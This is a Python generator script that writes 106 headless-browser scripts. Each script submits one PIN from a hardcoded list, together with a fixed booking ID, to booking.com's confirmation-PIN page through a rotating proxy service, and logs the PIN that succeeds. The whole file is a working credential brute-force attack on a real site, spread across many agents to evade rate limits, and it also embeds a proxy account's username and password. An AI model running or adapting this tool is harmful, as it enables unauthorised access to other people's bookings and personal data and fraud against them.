#!/usr/bin/env python3
"""
🏭 MEGA AGENT FACTORY - Fixed Version
Creates 106 individual agent files in a single 'agents' folder
"""

import os
from pathlib import Path

# Configuration
BOOKING_ID = "5724349472"
AGENTS_FOLDER = "agents"

# Your 106 PINs for rapid testing
PIN_LIST = [
    "6812", "4307", "1584", "9920", "7035", "4476", "6231", "3950", "7089", "1592",
    "7613", "2860", "0489", "9374", "2143", "8742", "5196", "3057", "1883", "7201",
    "6067", "8931", "5174", "6648", "3825", "7740", "4259", "9503", "3178", "8624",
    "7781", "3602", "9456", "8810", "0937", "2971", "4830", "7104", "3297", "6008",
    "4073", "2719", "1835", "8506", "2165", "6338", "1972", "9915", "5730", "8061",
    "2449", "3906", "7619", "6025", "4836", "9451", "3250", "8014", "2137", "1048",
    "8793", "6672", "1320", "5039", "4150", "9528", "6470", "3857", "7412", "2281",
    "6001", "8396", "9190", "4352", "1576", "7995", "1882", "7028", "3390", "1473",
    "2845", "5447", "3281", "9110", "4518", "6902", "7214", "0743", "2228", "3849",
    "1180", "6073", "2398", "7456", "6054", "5031", "1093", "2405", "7842", "4019",
    "3335", "7210", "6048", "1795", "9204", "2874"
]

def create_single_agent(agent_num, pin):
    """Create a single agent file"""
    agent_code = f'''#!/usr/bin/env python3
"""
🤖 MEGA AGENT #{agent_num:03d}
Booking ID: {BOOKING_ID}
Assigned PIN: {pin}
Single file execution - no dependencies
"""

from playwright.sync_api import sync_playwright
import sys
import time
from datetime import datetime

# Agent Configuration
AGENT_NUM = {agent_num}
BOOKING_ID = "{BOOKING_ID}"
ASSIGNED_PIN = "{pin}"

# Proxy Configuration
PROXY_CONFIG = {{
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}}

def log_message(message):
    """Simple logging"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"[{{timestamp}}] Agent #{AGENT_NUM:03d}: {{message}}")

def test_pin():
    """Main PIN testing function"""
    log_message(f"🚀 Testing PIN {{ASSIGNED_PIN}} for booking {{BOOKING_ID}}")
    
    try:
        with sync_playwright() as p:
            # Launch headless browser for efficiency
            browser = p.chromium.launch(
                headless=True,  # Invisible for speed
                proxy=PROXY_CONFIG,
                args=['--no-sandbox', '--disable-dev-shm-usage']
            )
            page = browser.new_page()
            
            # Navigate and test
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", timeout=20000)
            
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=10000)
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            page.fill('input[placeholder="e.g. 1234"]', ASSIGNED_PIN)
            
            # Submit
            try:
                page.click('button:has-text("Continue")')
            except:
                page.click('button[type="submit"]')
            
            # Wait for result
            page.wait_for_function(
                \\'\\'\\'() => location.href.includes('unique_order_id') || 
                        document.querySelector('.bui-alert--error') !== null\\'\\'\\'',
                timeout=20000
            )
            
            current_url = page.url
            
            if "unique_order_id=" in current_url:
                # SUCCESS!
                success_msg = f"MEGA_SUCCESS|AGENT_{{AGENT_NUM:03d}}|PIN_{{ASSIGNED_PIN}}|{{current_url}}|{{datetime.now()}}"
                log_message(f"🎉 SUCCESS! PIN {{ASSIGNED_PIN}} is CORRECT!")
                print(success_msg)
                
                # Write success file
                with open("MEGA_SUCCESS.txt", "w") as f:
                    f.write(success_msg)
                
                browser.close()
                return True
            else:
                log_message(f"❌ PIN {{ASSIGNED_PIN}} failed")
                browser.close()
                return False
                
    except Exception as e:
        log_message(f"💥 Error: {{str(e)}}")
        return False

if __name__ == "__main__":
    success = test_pin()
    sys.exit(0 if success else 1)
'''
    return agent_code

def create_mega_agents():
    """Create all agent files in single folder"""
    print(f"🏭 MEGA AGENT FACTORY - Creating agents in single folder")
    print(f"📁 Target folder: {AGENTS_FOLDER}")
    print(f"🎯 Booking ID: {BOOKING_ID}")
    print(f"📊 Total PINs: {len(PIN_LIST)}")
    print("="*60)
    
    # Create agents folder
    agents_path = Path(AGENTS_FOLDER)
    agents_path.mkdir(exist_ok=True)
    
    for i, pin in enumerate(PIN_LIST, 1):
        # Create agent code
        agent_code = create_single_agent(i, pin)
        
        # Write agent file
        agent_file = agents_path / f"agent_{i:03d}.py"
        with open(agent_file, "w", encoding="utf-8") as f:
            f.write(agent_code)
        
        print(f"✅ Agent #{i:03d}: agent_{i:03d}.py → PIN {pin}")
    
    print("="*60)
    print(f"🎉 SUCCESS! Created {len(PIN_LIST)} agents in '{AGENTS_FOLDER}' folder")
    print(f"📁 Structure: {AGENTS_FOLDER}/agent_001.py → agent_{len(PIN_LIST):03d}.py")
    print(f"🚀 Ready for batch execution!")

if __name__ == "__main__":
    create_mega_agents()
